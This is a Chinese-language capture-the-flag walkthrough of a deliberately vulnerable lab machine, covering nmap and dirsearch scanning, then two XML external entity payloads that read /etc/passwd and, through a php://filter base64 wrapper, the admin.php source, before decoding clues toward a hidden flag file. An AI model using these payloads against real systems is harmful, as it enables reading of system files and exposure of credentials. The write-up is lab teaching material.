0x02 探测

靶机开机后需要登录，而我不知道账号密码，所以就用nmap直接扫，扫出来我这是129

登录129后台，使用nmap搜索该ip

nmap -p- -sV -sC -A 192.168.10.129

可以看到有robots文件，并提示我们有xxe目录及admin.php页面

打开xxe目录，发现应该是有index页面

扫描xxe目录

dirsearch -u 192.168.10.129/xxe

发现了刚刚提到的admin.php

这里应该就有xxe利用了

0x03 漏洞利用

点击登录，便可抓包

包内容是xml，之后打payload就行，xml平时用的不多，作者提供了

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "file:///etc/passwd">
]>
<root>
    <name>&sp;</name>
    <password>hj</password>
</root>

探测漏洞，存在xxe，读取admin.php的源码

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=admin.php">
]>
<root>
    <name>&sp;</name>
    <password>hj</password>
</root>

将返回的信息进行base64解码

可以发现账号和密码写死在源码中，密码的md5经查询可知是admin@123

登录后发现会给我们flag

点进去就是刚刚第三个箭头的文件，所以账号密码其实没那么重要，但是该文件无法直接访问，于是继续读文件

提示告诉我们下一个地点，这里看起来像是base32，解码后是另一层base64，继续接吗得知是/etc/.flag.php，继续去读文件，得到新的源码
